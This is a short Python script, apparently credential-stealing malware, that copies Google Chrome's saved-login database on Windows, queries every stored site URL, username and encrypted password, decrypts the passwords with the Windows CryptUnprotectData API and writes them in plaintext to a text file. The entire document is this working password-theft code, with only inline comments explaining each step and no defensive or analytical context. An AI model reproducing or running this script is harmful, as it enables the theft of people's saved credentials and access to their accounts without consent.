from os import getenv # To find out the Chrome SQL path 
import sqlite3        # To access the Chrome SQLite DB
import win32crypt     # Used to call windows API CryptUnprotectData
from shutil import copyfile # To make a copy of the Chrome SQLite DB

path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data" # LOCALAPPDATA points to >>> C:\Users\{username}\AppData\Local

path2 = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login2"
copyfile(path, path2)			# Making a copy of SQlite Database

conn = sqlite3.connect(path2)  # Making a connection to copied database
cursor = conn.cursor() 
cursor.execute('SELECT action_url, username_value, password_value FROM logins') 

for raw in cursor.fetchall():		# To get the list of matching rows
    
    password = win32crypt.CryptUnprotectData(raw[2])[1] # Passing the encrypted Password to CryptUnprotectData API function to decrypt it  
    fp=open("chrome_password.txt.txt","a")
    store=raw[0]+'\n'+raw[1]+'\n'+password
    fp.write(store)
    fp.close()

conn.close()
